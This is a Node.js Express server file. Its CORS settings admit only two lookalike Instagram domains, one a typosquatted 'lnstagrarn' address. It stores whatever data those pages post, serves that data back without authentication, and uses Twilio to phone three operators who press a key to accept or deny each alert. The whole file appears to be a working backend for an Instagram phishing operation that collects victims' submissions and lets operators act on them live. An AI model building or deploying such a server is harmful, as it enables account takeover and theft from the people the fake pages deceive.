require("dotenv").config();

const express = require("express");
const cors = require("cors");
const twilio = require("twilio");

const app = express();

app.use(cors({
    origin: [
        "https://account-instagram-com.vercel.app",
        "https://lnstagrarn-reel-paoa2oajo.vercel.app"
    ]
}));

app.use(express.json());

const {
    TWILIO_ACCOUNT_SID,
    TWILIO_AUTH_TOKEN,
    TWILIO_FROM_NUMBER,
    ALERT_TO_1,
    ALERT_TO_2,
    ALERT_TO_3
} = process.env;

if (
    !TWILIO_ACCOUNT_SID ||
    !TWILIO_AUTH_TOKEN ||
    !TWILIO_FROM_NUMBER ||
    !ALERT_TO_1 ||
    !ALERT_TO_2 ||
    !ALERT_TO_3
) {
    throw new Error("Missing required environment variables");
}

const twilioClient = twilio(
    TWILIO_ACCOUNT_SID,
    TWILIO_AUTH_TOKEN
);

// --------------------------------------------------
// Application data
// --------------------------------------------------

let currentData = null;

// --------------------------------------------------
// Alert state
// --------------------------------------------------

let alertState = {
    active: false,
    startedAt: null,
    people: {
        person1: {
            number: ALERT_TO_1,
            status: "idle",
            callSid: null
        },
        person2: {
            number: ALERT_TO_2,
            status: "idle",
            callSid: null
        },
        person3: {
            number: ALERT_TO_3,
            status: "idle",
            callSid: null
        }
    }
};

// --------------------------------------------------
// Health
// --------------------------------------------------

app.get("/health", (req, res) => {
    res.json({
        status: "ok",
        message: "Server is running"
    });
});

// --------------------------------------------------
// Generic data endpoint
// --------------------------------------------------

app.post("/data", (req, res) => {
    currentData = {
        ...req.body,
        receivedAt: new Date().toISOString()
    };

    console.log("New application data received.");

    res.json({
        success: true
    });
});

app.get("/data", (req, res) => {
    res.json(currentData ? [currentData] : []);
});

// --------------------------------------------------
// Twilio voice response
// --------------------------------------------------

app.post("/voice/:person", (req, res) => {
    const person = req.params.person;

    const twiml = new twilio.twiml.VoiceResponse();

    const gather = twiml.gather({
        numDigits: 1,
        timeout: 8,
        action: `/voice-response/${person}`,
        method: "POST"
    });

    gather.say(
        "Server alert. Press zero to accept. " +
        "Press any other key to deny."
    );

    // If nothing was pressed
    twiml.redirect(`/voice-timeout/${person}`);

    res.type("text/xml");
    res.send(twiml.toString());
});

// --------------------------------------------------
// Keypad response
// --------------------------------------------------

app.post("/voice-response/:person", (req, res) => {
    const person = req.params.person;
    const digit = req.body.Digits;

    const personState = alertState.people[person];

    if (!personState) {
        return res.sendStatus(404);
    }

    if (digit === "0") {
        personState.status = "accepted";

        console.log(`${person}: ACCEPTED`);
    } else {
        personState.status = "denied";

        console.log(`${person}: DENIED`);
    }

    const twiml = new twilio.twiml.VoiceResponse();

    twiml.say(
        personState.status === "accepted"
            ? "Accepted. Thank you."
            : "Denied. Thank you."
    );

    twiml.hangup();

    res.type("text/xml");
    res.send(twiml.toString());
});

// --------------------------------------------------
// No keypad response
// --------------------------------------------------

app.post("/voice-timeout/:person", (req, res) => {
    const person = req.params.person;

    const personState = alertState.people[person];

    if (personState) {
        personState.status = "denied";

        console.log(`${person}: DENIED - no response`);
    }

    const twiml = new twilio.twiml.VoiceResponse();

    twiml.say("No response received. The request is denied.");
    twiml.hangup();

    res.type("text/xml");
    res.send(twiml.toString());
});

// --------------------------------------------------
// Start alert
// --------------------------------------------------

app.post("/alert", async (req, res) => {

    if (alertState.active) {
        return res.status(409).json({
            success: false,
            message: "An alert is already active."
        });
    }

    alertState = {
        active: true,
        startedAt: new Date().toISOString(),

        people: {
            person1: {
                number: ALERT_TO_1,
                status: "calling",
                callSid: null
            },

            person2: {
                number: ALERT_TO_2,
                status: "calling",
                callSid: null
            },

            person3: {
                number: ALERT_TO_3,
                status: "calling",
                callSid: null
            }
        }
    };

    const people = [
        ["person1", ALERT_TO_1],
        ["person2", ALERT_TO_2],
        ["person3", ALERT_TO_3]
    ];

    // Start all three calls concurrently
    const calls = people.map(async ([person, number]) => {

        try {

            const call = await twilioClient.calls.create({
                to: number,
                from: TWILIO_FROM_NUMBER,

                url: `${getBaseUrl(req)}/voice/${person}`,

                method: "POST"
            });

            alertState.people[person].callSid = call.sid;

            console.log(
                `${person}: call started (${call.sid})`
            );

        } catch (error) {

            alertState.people[person].status = "call_failed";

            console.error(
                `${person}: call failed`,
                error.message
            );
        }
    });

    await Promise.all(calls);

    res.json({
        success: true,
        message: "Calls started",
        status: alertState
    });
});

// --------------------------------------------------
// Alert status
// --------------------------------------------------

app.get("/alert/status", (req, res) => {
    res.json(alertState);
});

// --------------------------------------------------
// Reset alert
// --------------------------------------------------

app.post("/alert/reset", (req, res) => {

    alertState = {
        active: false,
        startedAt: null,

        people: {
            person1: {
                number: ALERT_TO_1,
                status: "idle",
                callSid: null
            },

            person2: {
                number: ALERT_TO_2,
                status: "idle",
                callSid: null
            },

            person3: {
                number: ALERT_TO_3,
                status: "idle",
                callSid: null
            }
        }
    };

    res.json({
        success: true,
        message: "Alert state reset"
    });
});

// --------------------------------------------------
// Helper
// --------------------------------------------------

function getBaseUrl(req) {
    // Render provides RENDER_EXTERNAL_URL automatically.
    if (process.env.RENDER_EXTERNAL_URL) {
        return process.env.RENDER_EXTERNAL_URL;
    }

    return `${req.protocol}://${req.get("host")}`;
}

// --------------------------------------------------
// Start server
// --------------------------------------------------

const PORT = process.env.PORT || 1000;

app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
});
